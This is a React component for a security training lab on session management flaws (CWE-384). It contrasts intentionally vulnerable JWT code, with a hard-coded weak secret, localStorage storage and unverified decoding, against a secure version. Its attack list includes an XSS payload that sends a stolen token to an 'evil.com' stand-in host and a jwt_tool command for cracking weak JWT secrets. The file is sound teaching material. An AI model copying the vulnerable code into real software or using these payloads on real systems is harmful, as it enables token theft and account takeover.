import React from 'react';
import { VulnerabilityConfig, TestResult } from '../SecurityLabDashboard';
import { VulnerabilityLabTemplate } from './VulnerabilityLabTemplate';

interface SessionManagementLabProps {
  config: VulnerabilityConfig;
  enabled: boolean;
  onToggle: () => void;
  onTest: (vulnType: string, payload: string, target?: string) => Promise<TestResult>;
  testResults: TestResult[];
}

export const SessionManagementLab: React.FC<SessionManagementLabProps> = ({
  config,
  enabled,
  onToggle,
  onTest,
  testResults
}) => {
  const vulnerableCode = `// VULNERABLE CODE - Weak Session Management
const generateToken = (user) => {
  // DANGER: Weak secret and long expiration
  return jwt.sign(
    { userId: user.id, email: user.email },
    'weak-secret-key', // Predictable secret
    { expiresIn: '30d' } // Overly long expiration
  );
};

// Frontend - Insecure token storage
const login = async (credentials) => {
  const response = await api.post('/auth/login', credentials);
  
  // DANGER: Token stored in localStorage
  localStorage.setItem('token', response.data.token);
  
  // DANGER: Token logged to console
  console.log('Login successful, token:', response.data.token);
  
  setUser(response.data.user);
};

// VULNERABLE: No token refresh mechanism
const logout = () => {
  // DANGER: Only removes token locally, server doesn't invalidate
  localStorage.removeItem('token');
  setUser(null);
};

// VULNERABLE: Weak token validation
const validateToken = (token) => {
  try {
    // DANGER: Client-side validation only
    const decoded = jwt.decode(token);
    return decoded && decoded.exp > Date.now() / 1000;
  } catch {
    return false;
  }
};`;

  const secureCode = `// SECURE CODE - Strong Session Management
const generateToken = (user) => {
  // Safe: Strong secret and reasonable expiration
  return jwt.sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET, // Strong, random secret from env
    { expiresIn: '15m' } // Short expiration with refresh
  );
};

const generateRefreshToken = (user) => {
  return jwt.sign(
    { userId: user.id, type: 'refresh' },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );
};

// Frontend - Secure token handling
const login = async (credentials) => {
  const response = await api.post('/auth/login', credentials);
  
  // Safe: Server sets httpOnly cookie
  // No manual token storage needed
  setUser(response.data.user);
};

// SECURE: Proper logout with server invalidation
const logout = async () => {
  try {
    // Safe: Notify server to invalidate session
    await api.post('/auth/logout');
  } catch (error) {
    console.error('Logout error:', error);
  } finally {
    // Clear local state
    setUser(null);
  }
};

// Backend - Secure session management
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 15 * 60 * 1000 // 15 minutes
  }
}));`;

  const testPayloads = [
    "Decode JWT token client-side",
    "Check token expiration time",
    "Test with expired token",
    "Brute force weak JWT secret",
    "Session fixation attack",
    "Token stored in localStorage",
    "No server-side session invalidation",
    "Concurrent session testing"
  ];

  const sessionVulnerabilities = [
    {
      vulnerability: "Weak JWT Secrets",
      description: "Using predictable or weak secrets for token signing",
      example: "jwt.sign(payload, 'secret123')",
      impact: "Attackers can forge valid tokens and impersonate users",
      exploitation: "Use tools like jwt_tool or hashcat to crack weak secrets"
    },
    {
      vulnerability: "Long Token Expiration",
      description: "Tokens that remain valid for extended periods",
      example: "expiresIn: '30d' or no expiration",
      impact: "Stolen tokens remain valid for long periods",
      exploitation: "Stolen tokens can be used for weeks or months"
    },
    {
      vulnerability: "Client-Side Token Storage",
      description: "Storing tokens in localStorage or sessionStorage",
      example: "localStorage.setItem('token', jwt)",
      impact: "Tokens accessible via XSS attacks",
      exploitation: "XSS payload: localStorage.getItem('token')"
    },
    {
      vulnerability: "No Token Refresh",
      description: "Lack of token refresh mechanism",
      example: "Single long-lived token without refresh",
      impact: "Forces long expiration times, increasing risk",
      exploitation: "Stolen tokens remain valid until natural expiration"
    },
    {
      vulnerability: "Insufficient Session Invalidation",
      description: "Logout doesn't invalidate server-side sessions",
      example: "Only clearing client-side token storage",
      impact: "Tokens remain valid after logout",
      exploitation: "Reuse tokens after user logout"
    }
  ];

  const attackScenarios = [
    {
      attack: "JWT Secret Brute Force",
      description: "Attempt to crack weak JWT signing secrets",
      tools: ["jwt_tool", "hashcat", "john"],
      payload: "jwt_tool -C -d /usr/share/wordlists/rockyou.txt <token>"
    },
    {
      attack: "Session Fixation",
      description: "Force user to use attacker-controlled session ID",
      tools: ["Burp Suite", "Custom scripts"],
      payload: "Set session ID before login, maintain after authentication"
    },
    {
      attack: "Token Theft via XSS",
      description: "Steal tokens stored in localStorage via XSS",
      tools: ["XSS payloads", "Malicious scripts"],
      payload: "<script>fetch('/evil.com?token='+localStorage.token)</script>"
    },
    {
      attack: "Concurrent Session Testing",
      description: "Test if multiple sessions are properly managed",
      tools: ["Multiple browsers", "API clients"],
      payload: "Login from multiple locations simultaneously"
    }
  ];

  return (
    <VulnerabilityLabTemplate
      title="Session Management Laboratory (CWE-384)"
      description="Learn about session management vulnerabilities and how to implement secure authentication systems."
      vulnerableCode={vulnerableCode}
      secureCode={secureCode}
      enabled={enabled}
      onToggle={onToggle}
      testPayloads={testPayloads}
      onTest={onTest}
      testResults={testResults}
      vulnerabilityType="sessionManagement"
      additionalContent={
        <div className="space-y-6">
          {/* Session Vulnerabilities */}
          <div className="bg-red-50 border border-red-200 rounded-lg p-4">
            <h4 className="font-semibold text-red-900 mb-3">🎯 Session Management Vulnerabilities</h4>
            <div className="space-y-4">
              {sessionVulnerabilities.map((vuln, index) => (
                <div key={index} className="border-l-4 border-red-400 pl-4">
                  <h5 className="font-medium text-red-900">{vuln.vulnerability}</h5>
                  <p className="text-sm text-red-700 mb-2">{vuln.description}</p>
                  <code className="block bg-red-100 p-2 rounded text-xs font-mono text-red-800 mb-2">
                    {vuln.example}
                  </code>
                  <p className="text-xs text-red-600 mb-1"><strong>Impact:</strong> {vuln.impact}</p>
                  <p className="text-xs text-red-600 italic"><strong>Exploitation:</strong> {vuln.exploitation}</p>
                </div>
              ))}
            </div>
          </div>

          {/* Attack Scenarios */}
          <div className="bg-orange-50 border border-orange-200 rounded-lg p-4">
            <h4 className="font-semibold text-orange-900 mb-3">⚔️ Attack Scenarios</h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {attackScenarios.map((attack, index) => (
                <div key={index} className="bg-white border border-orange-200 rounded p-3">
                  <h5 className="font-medium text-orange-800 mb-1">{attack.attack}</h5>
                  <p className="text-xs text-orange-700 mb-2">{attack.description}</p>
                  <div className="mb-2">
                    <span className="text-xs font-medium text-orange-800">Tools:</span>
                    <div className="flex flex-wrap gap-1 mt-1">
                      {attack.tools.map((tool, toolIndex) => (
                        <span key={toolIndex} className="bg-orange-100 text-orange-800 text-xs px-2 py-1 rounded">
                          {tool}
                        </span>
                      ))}
                    </div>
                  </div>
                  <code className="block bg-orange-100 p-2 rounded text-xs font-mono text-orange-800 break-all">
                    {attack.payload}
                  </code>
                </div>
              ))}
            </div>
          </div>

          {/* JWT Security Analysis */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
            <h4 className="font-semibold text-blue-900 mb-3">🔍 JWT Security Analysis</h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h5 className="font-medium text-blue-800 mb-2">Vulnerable JWT Structure</h5>
                <div className="bg-white border border-blue-200 rounded p-3 text-xs font-mono">
                  <div className="text-red-600">Header: {"{"}"alg":"HS256","typ":"JWT"{"}"}</div>
                  <div className="text-orange-600">Payload: {"{"}"userId":123,"exp":1234567890{"}"}</div>
                  <div className="text-red-600">Signature: HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), "weak-secret")</div>
                </div>
              </div>
              <div>
                <h5 className="font-medium text-blue-800 mb-2">Security Issues</h5>
                <ul className="text-sm text-blue-700 space-y-1">
                  <li>• Weak signing secret ("weak-secret")</li>
                  <li>• Long expiration time (30 days)</li>
                  <li>• No refresh token mechanism</li>
                  <li>• Client-side storage vulnerability</li>
                </ul>
              </div>
            </div>
          </div>

          {/* Prevention Strategies */}
          <div className="bg-green-50 border border-green-200 rounded-lg p-4">
            <h4 className="font-semibold text-green-900 mb-3">🛡️ Secure Session Management</h4>
            <div className="space-y-4">
              <div>
                <h5 className="font-medium text-green-800">1. Strong JWT Secrets</h5>
                <p className="text-sm text-green-700 mb-2">Use cryptographically strong, random secrets</p>
                <code className="block bg-green-100 p-2 rounded text-xs font-mono text-green-800">
                  {`JWT_SECRET=$(openssl rand -base64 64)`}
                </code>
              </div>
              
              <div>
                <h5 className="font-medium text-green-800">2. Short Token Expiration + Refresh</h5>
                <p className="text-sm text-green-700 mb-2">Use short-lived access tokens with refresh mechanism</p>
                <code className="block bg-green-100 p-2 rounded text-xs font-mono text-green-800">
                  {`accessToken: 15m, refreshToken: 7d`}
                </code>
              </div>
              
              <div>
                <h5 className="font-medium text-green-800">3. HttpOnly Cookies</h5>
                <p className="text-sm text-green-700 mb-2">Store tokens in secure, httpOnly cookies</p>
                <code className="block bg-green-100 p-2 rounded text-xs font-mono text-green-800">
                  {`Set-Cookie: token=jwt; HttpOnly; Secure; SameSite=Strict`}
                </code>
              </div>
              
              <div>
                <h5 className="font-medium text-green-800">4. Server-Side Session Tracking</h5>
                <p className="text-sm text-green-700 mb-2">Maintain session state on server for invalidation</p>
                <code className="block bg-green-100 p-2 rounded text-xs font-mono text-green-800">
                  {`redis.del('session:' + sessionId)`}
                </code>
              </div>
            </div>
          </div>

          {/* Session Security Checklist */}
          <div className="bg-purple-50 border border-purple-200 rounded-lg p-4">
            <h4 className="font-semibold text-purple-900 mb-3">✅ Session Security Checklist</h4>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <h5 className="font-medium text-purple-800 mb-2">Authentication</h5>
                <ul className="text-sm text-purple-700 space-y-1">
                  <li>✓ Strong password requirements</li>
                  <li>✓ Multi-factor authentication</li>
                  <li>✓ Account lockout policies</li>
                  <li>✓ Secure password reset</li>
                </ul>
              </div>
              <div>
                <h5 className="font-medium text-purple-800 mb-2">Session Management</h5>
                <ul className="text-sm text-purple-700 space-y-1">
                  <li>✓ Secure session generation</li>
                  <li>✓ Session timeout policies</li>
                  <li>✓ Concurrent session limits</li>
                  <li>✓ Proper logout handling</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      }
    />
  );
};